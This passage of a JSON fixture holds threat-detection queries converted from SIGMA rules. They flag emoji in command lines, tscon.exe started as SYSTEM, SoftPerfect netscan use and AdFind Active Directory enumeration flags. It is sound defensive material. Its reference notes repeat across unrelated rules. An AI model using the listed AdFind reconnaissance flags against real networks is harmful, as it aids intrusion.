\"\ud83d\ude4f\ud83c\udfff\" or tgt.process.cmdline contains \"\u270d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd33\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udd74\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udfff\" or tgt.process.cmdline contains \"\u26f9\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc36\" or tgt.process.cmdline contains \"\ud83d\udc31\" or tgt.process.cmdline contains \"\ud83d\udc2d\" or tgt.process.cmdline contains \"\ud83d\udc39\" or tgt.process.cmdline contains \"\ud83d\udc30\" or tgt.process.cmdline contains \"\ud83e\udd8a\" or tgt.process.cmdline contains \"\ud83d\udc3b\" or tgt.process.cmdline contains \"\ud83d\udc3c\" or tgt.process.cmdline contains \"\ud83d\udc3b\u200d\u2744\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc28\" or tgt.process.cmdline contains \"\ud83d\udc2f\" or tgt.process.cmdline contains \"\ud83e\udd81\" or tgt.process.cmdline contains \"\ud83d\udc2e\" or tgt.process.cmdline contains \"\ud83d\udc37\" or tgt.process.cmdline contains \"\ud83d\udc3d\" or tgt.process.cmdline contains \"\ud83d\udc38\" or tgt.process.cmdline contains \"\ud83d\udc35\" or tgt.process.cmdline contains \"\ud83d\ude48\" or tgt.process.cmdline contains \"\ud83d\ude49\" or tgt.process.cmdline contains \"\ud83d\ude4a\" or tgt.process.cmdline contains \"\ud83d\udc12\" or tgt.process.cmdline contains \"\ud83d\udc14\" or tgt.process.cmdline contains \"\ud83d\udc27\" or tgt.process.cmdline contains \"\ud83d\udc26\" or tgt.process.cmdline contains \"\ud83d\udc24\" or tgt.process.cmdline contains \"\ud83d\udc23\" or tgt.process.cmdline contains \"\ud83d\udc25\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 651
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a tscon.exe start as LOCAL SYSTEM",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Suspicious TSCON Start as SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\") and tgt.process.image.path contains \"\\tscon.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 652
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of SoftPerfect's \"netscan.exe\". An application for scanning networks.\nIt is actively used in-the-wild by threat actors to inspect and understand the network architecture of a victim.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1046"
            ],
            "name": "PUA - SoftPerfect Netscan Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\netscan.exe\" or tgt.process.displayName=\"Network Scanner\" or tgt.process.displayName=\"Application for scanning networks\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 653
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects active directory enumeration activity using known AdFind CLI flags",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087"
            ],
            "name": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"lockoutduration\" or tgt.process.cmdline contains \"lockoutthreshold\" or tgt.process.cmdline contains \"lockoutobservationwindow\" or tgt.process.cmdline contains \"maxpwdage\" or tgt.process.cmdline contains \"minpwdage\" or tgt.process.cmdline contains \"minpwdlength\" or tgt.process.cmdline contains \"pwdhistorylength\" or tgt.process.cmdline contains \"pwdproperties\") or tgt.process.cmdline contains \"-sc admincountdmp\" or tgt.process.cmdline contains \"-sc exchaddresses\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 654
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
